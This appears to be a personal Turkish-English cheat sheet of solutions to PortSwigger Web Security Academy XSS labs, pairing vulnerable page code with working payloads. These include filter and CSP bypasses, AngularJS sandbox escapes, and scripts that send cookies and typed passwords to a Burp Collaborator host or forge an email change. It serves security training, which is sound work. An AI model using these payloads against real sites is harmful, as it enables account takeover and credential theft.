                                             ############################################################################################################
                                             #####                       Reflected XSS into HTML context with nothing encoded                       #####                                           
                                             #####                       XSS'yi hiçbir şey kodlanmadan HTML bağlamına yansıttı                      #####
                                             ############################################################################################################
1--> <script>alert(1)</script> => search kısmı reflected
                                             ############################################################################################################
                                             #####                       Stored XSS into HTML context with nothing encoded                          #####
                                             #####                       XSS hiçbir şey kodlanmadan HTML bağlamına depolandı                        #####
                                             ############################################################################################################
2--> <script>alert(1)</script> => comment kısmı stored
                                             ############################################################################################################
                                             #####                       DOM XSS in document.write sink using source location.search                #####
                                             #####                       document.writeKaynağı kullanarak havuzda DOM XSSlocation.search            #####
                                             ############################################################################################################
3--> "><svg onload=alert(1)> => document write ve location.search kaynaklı açık
kaynağı
<script>
                        function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>
                                             ############################################################################################################
                                             #####                        DOM XSS in innerHTML sink using source location.search                    #####
                                             #####                       innerHTMLKaynağı kullanarak havuzda DOM XSSlocation.search                 #####
                                             ############################################################################################################
4--> <img src=1 onerror=alert(1)>
kaynağı
<script>
                            function doSearchQuery(query) {
                                document.getElementById('searchMessage').innerHTML = query;
                            }
                            var query = (new URLSearchParams(window.location.search)).get('search');
                            if(query) {
                                doSearchQuery(query);
                            }
                        </script>
                                             ################################################################################################################################
                                             #####                       DOM XSS in jQuery anchor href attribute sink using location.search source                      #####
                                             #####                       Kaynağı hrefkullanarak jQuery bağlantı özelliği havuzundaki DOM XSSlocation.search             #####
                                             ################################################################################################################################
5--> ?returnPath=alert(document.cookie) çalışıyor.
Enter'a basın ve "geri"ye tıklayın.
returnpath=/1234abcd yazarak açığı inspect elementten kontrol edebiliyoruz.

kaynağı
<script>
                            $(function() {
                                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                            });
                        </script>
                                             #################################################################################################################
                                             #####                       DOM XSS in jQuery selector sink using a hashchange event                        #####
                                             #####                       Bir hashchange olayı kullanarak jQuery seçici havuzundaki DOM XSS               #####
                                             #################################################################################################################
6--> #" onload="this.src+='<img src=x onerror=print()>'"></iframe> => bu kodu site sonunda çalıştırıp print fonsiyonunu tetikleyebiliyoruz.
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
kaynak kodu burpsuite ile yakalayabiliyoruz
<script>
                        $(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
                    </script>
                                              ################################################################################################################
                                              #####                      Reflected XSS into attribute with angle brackets HTML-encoded                   #####
                                              #####                      HTML kodlu açılı ayraçlarla özniteliğe yansıtılan XSS                           #####
                                              ################################################################################################################
7--> "onmouseover="alert(1) => searh kısmında çalışan xss(reflected) 
rastgele bir yazı yazıp site kodlarında özniteliğe eklendiğini görüyoruz.
                                              ################################################################################################################
                                              #####                      Stored XSS into anchor href attribute with double quotes HTML-encoded           #####  
                                              #####                      hrefHTML kodlu çift tırnaklı bağlantı özelliğine depolanan XSS                  #####
                                              ################################################################################################################
8--> javascript:alert(1) => form içinde website kısmında xss çalıştırabiliyoruz.
                                              ################################################################################################################
                                              #####                      Reflected XSS into a JavaScript string with angle brackets HTML encoded         #####
                                              #####                      XSS, HTML kodlu açılı ayraçlarla bir JavaScript dizesine yansıtıldı             #####
                                              ################################################################################################################
9--> '-alert(1)-' => search kısmında çalışan xss payload
burpsuite açıp search kısmına aaa yazınca repeater send ettikten sonra zaafiyetli kodlar karşımızda
<script>
                        var searchTerms = 'aaa';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
                                              #############################################################################################################################################
                                              #####                      DOM XSS in document.write sink using source location.search inside a select element                          #####
                                              #####                      Bir seçme öğesinin içindeki document.write kaynağı kullanan havuzdaki DOM XSS location.search                #####
                                              #############################################################################################################################################
10--> product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)> => burpsuite storeid parametresine fuzzing yapıyoruz.
kaynak kodları
<script>
                                var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
                                document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
                                for(var i=0;i<stores.length;i++) {
                                    if(stores[i] === store) {
                                        continue;
                                    }
                                    document.write('<option>'+stores[i]+'</option>');
                                }
                                document.write('</select>');
                            </script>
                                              #############################################################################################################################################
                                              #####                       DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded                          #####
                                              #####                       Açılı parantez ve çift tırnak içeren AngularJS ifadesinde DOM XSS HTML kodlu                                #####
                                              #############################################################################################################################################
11--> {{$on.constructor('alert(1)')()}} => Angular js. ng-app kütüphanesindeki zafiyet 
                                              ####################################################################################################
                                              #####                       Reflected DOM XSS                                                  #####
                                              #####                       Yansıyan DOM XSS                                                   #####
                                              ####################################################################################################
12-> \"-alert(1)}// => eval fonksiyonu kullanan bir js. doslasından kaynaklanan xss zaafiyetidir. (/resources/js/searchResults.js inceleyin.)
kaynak kodları
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
                                              ####################################################################################    
                                              #####                       Stored DOM XSS                                     #####
                                              #####                       Depolanan DOM XSS                                  #####
                                              ####################################################################################
13--> <><img src=1 onerror=alert(1)> => replace() fonksiyonunu yanlış kullanımından kaynaklı xss açığı var.
                                              ###########################################################################################################################
                                              #####                      Reflected XSS into HTML context with most tags and attributes blocked                      #####
                                              #####                      Çoğu etiket ve öznitelik engellenerek XSS'yi HTML bağlamına yansıttı                       #####
                                              ###########################################################################################################################
14--> <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
<img src=1 onerror=alert(1)> => payload engelleniyorsa yani güvenlik duvarı açıksa hedefte engellenmeyen etiketleri fuzz ediyoruz.
body etiketini bulmak için
<§§> deneniyor.
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet => copy tags to clipboard
body bulduktan sonra copy events to clipboard
<body%20§§=1>
onresize bulduktan sonra
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'> => deliver to victim
                                              ###########################################################################################################################
                                              #####                      Reflected XSS into HTML context with all tags blocked except custom ones                   ##### 
                                              #####                      Özel olanlar hariç tüm etiketler engellenerek XSS HTML bağlamına yansıtıldı                #####
                                              ###########################################################################################################################
15--> %3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x => payload'ın decode edilmiş hali => <xss id=x onfocus=alert(document.cookie) tabindex=1>#x
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script> => depola ve kurbana gönder
                                              ################################################################################################################
                                              #####                     Reflected XSS with some SVG markup allowed                                       #####
                                              #####                     Bazı SVG işaretlemelerine izin verilen yansıtılmış XSS                           #####
                                              ################################################################################################################
16--> https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
<img src=1 onerror=alert(1)> => payload engelleniyorsa yani güvenlik duvarı açıksa hedefte engellenmeyen etiketleri fuzz ediyoruz.
kodun decode hali => "><svg><animatetransform onbegin=alert(1)>
                                              #####################################################################################################
                                              #####                      Reflected XSS in canonical link tag                                  #####
                                              #####                      Kanonik bağlantı etiketinde yansıtılan XSS                           #####
                                              #####################################################################################################
17--> https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
Windows'ta:ALT+SHIFT+X
MacOS'ta:CTRL+ALT+X
Linux'ta:Alt+X basınca çalışır.
kodun decode hali => ?%27accesskey=%27x%27onclick=%27alert(1)
                                              ######################################################################################################################################
                                              #####                      Reflected XSS into a JavaScript string with single quote and backslash escaped                        #####
                                              #####                      XSS, tek tırnak ve ters eğik çizginin kaçtığı bir JavaScript dizesine yansıtıldı                      #####
                                              ######################################################################################################################################
18--> </script><script>alert(1)</script>
zaafiyetin kaynaklandığı kod satırları
                   <script>
                        var searchTerms = 'aaa';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
                                             ###########################################################################################################################################################################
                                             #####                        Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped                      #####
                                             #####                        XSS, açılı ayraçlar ve HTML kodlu çift tırnaklar ve kaçan tek tırnaklar ile bir JavaScript dizesine yansıtıldı                           #####
                                             ###########################################################################################################################################################################
19--> \'-alert(1)//  
zaafiyetin kaynaklandığı kod satırları
                   <script>
                        var searchTerms = 'aaa';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>                 
                                             ############################################################################################################################################################################
                                             #####                       Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped                   #####
                                             #####                       onclickXSS , HTML kodlu köşeli ayraçlar ve çift tırnaklarla ve tek tırnaklar ve ters eğik çizgiden kaçılarak olaya depolandı               #####
                                             ############################################################################################################################################################################
20--> http://foo?&apos;-alert(1)-&apos; => web sitesi kısmına https://aaa.aaa.com girince sayfadan dönen sonuç onclick() fonksiyonunu tetikliyor.
kodlar
<a id="author" href="https://aaa.aaa.com" onclick="var tracker={track(){}};tracker.track('https://aaa.aaa.com');">asd</a>
                                             #######################################################################################################################################################################################
                                             #####                       Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped                             #####
                                             #####                       XSS, açılı ayraçlar, tek, çift tırnaklar, ters eğik çizgi ve ters tırnak işaretleri içeren bir şablon değişmezine yansıtıldı Unicode çıkışlı          #####
                                             #######################################################################################################################################################################################
21--> ${alert(1)} => search kısmına (search kısmına rastgele bir yazı yazıp javascript içeriğine yansıtıldığını görüyoruz.)  
kodlar
                       <script>
                            var message = `0 search results for 'asd'`;
                            document.getElementById('searchMessage').innerText = message;
                        </script>
                                             #######################################################################################################################
                                             #####                       Exploiting cross-site scripting to steal cookies                                      #####
                                             #####                       Çerezleri çalmak için siteler arası komut dosyasından yararlanma                      #####
                                             #######################################################################################################################
22--> (COLLABORATOR)
BURP COLLABORATOR İLE
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>  
                                             #######################################################################################################################
                                             #####                        Exploiting cross-site scripting to capture passwords                                 #####
                                             #####                        Parolaları yakalamak için siteler arası komut dosyasından yararlanma                 #####
                                             #######################################################################################################################
23--> (COLLABORATOR)
BURP COLLABORATOR İLE
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
                                             ########################################################################################################################
                                             #####                      Exploiting XSS to perform CSRF                                                          #####
                                             #####                      CSRF gerçekleştirmek için XSS'den yararlanma                                            #####
                                             ########################################################################################################################
24-->   
Giriş yapılan bir kullanıcı üzerinden email değiştirme isteğine csrf tokeni oluşuyorsa payload comment satırında çalışabilir(/my-account/change-email)
kodlar
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
                                            #########################################################################################################################
                                            #####                       Reflected XSS with AngularJS sandbox escape without strings                             #####
                                            #####                       Dizeler olmadan AngularJS korumalı alan kaçışı ile yansıtılmış XSS                      #####
                                            #########################################################################################################################
25--> 1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 => search parametresine yazılarak çalıştırılır.
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
açıklama
İstismar, toString()tırnak işareti kullanmadan bir dize oluşturmak için kullanılır. Daha sonra prototipi alır Stringve charAther dize için işlevin üzerine yazar. Bu, AngularJS sanal alanını etkili bir şekilde bozar. Daha sonra filtreye bir dizi iletilir orderBy. toString()Daha sonra , bir dize oluşturmak için ve yapıcı özelliğini kullanarak filtrenin argümanını tekrar ayarladık String. fromCharCodeSon olarak, karakter kodlarını string'e dönüştürerek veri yükümüzü oluşturma yöntemini kullanıyoruz x=alert(1). charAtFonksiyonun üzerine yazıldığı için AngularJS normalde izin vermeyeceği bu koda izin verecektir.

                                            #########################################################################################################################
                                            #####                        Reflected XSS with AngularJS sandbox escape and CSP                                    #####
                                            #####                        AngularJS korumalı alan kaçışı ve CSP ile yansıtılmış XSS                              #####
                                            #########################################################################################################################
26--> ?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x => store ve kurbana gönder.  
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
kodun decode hali => <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x

                                             ################################################################################################################################################################
                                             #####                        Reflected XSS with event handlers and href attributes blocked                                                                 #####
                                             #####                        Olay işleyicileri ve href öznitelikler engellenmiş olarak yansıtılan XSS => white list kullanan bir xss örneği                #####
                                             ################################################################################################################################################################
27--> %3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
decode hali => <svg><a><animate+attributeName=href+values=javascript:alert(1) /><text+x=20+y=20>Click me</text></a>
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

                                             #########################################################################################################################
                                             #####                      Reflected XSS in a JavaScript URL with some characters blocked                           #####
                                             #####                      Bazı karakterlerin engellendiği bir JavaScript URL'sinde XSS yansıtıldı                  #####
                                             #########################################################################################################################
28--> &%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
decode hali => &'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
Görünüşe göre tek tırnak işareti black liste eklenmiş ancak encode ile aşılabilir.

                                             #############################################################################################################################
                                             #####                       Reflected XSS protected by very strict CSP, with dangling markup attack                     #####
                                             #####                       Sarkan işaretleme saldırısıyla çok katı CSP tarafından korunan yansıtılmış XSS              #####
                                             #############################################################################################################################
29--> (BURP COLLABORATOR)
<script>
if(window.name) {
		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
                                             ########################################################################################################################## 
                                             #####                       Reflected XSS protected by CSP, with CSP bypass                                          #####
                                             #####                       CSP bypass ile CSP tarafından korunan yansıtılmış XSS                                    #####
                                             ##########################################################################################################################
30--> https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27          
decode hali => <script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
<img src=1 onerror=alert(1)>
deneyince
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token= dönüyor RESPONSE
Burp Proxy'de yanıtın bir Content-Security-Policybaşlık içerdiğini ve report-uriyönergenin adı verilen bir parametre içerdiğini gözlemleyin token. Parametreyi kontrol edebildiğiniz için tokenkendi CSP direktiflerinizi politikaya enjekte edebilirsiniz.
Enjeksiyon script-src-elemCSP'deki direktifi kullanır. Bu yönerge yalnızca öğeleri hedeflemenize olanak tanır script. script-srcBu yönergeyi kullanarak, satır içi komut dosyaları kullanmanıza olanak tanıyan unsafe-inline inject komutunu kullanmanıza olanak tanıyan mevcut kuralların üzerine yazabilirsiniz.

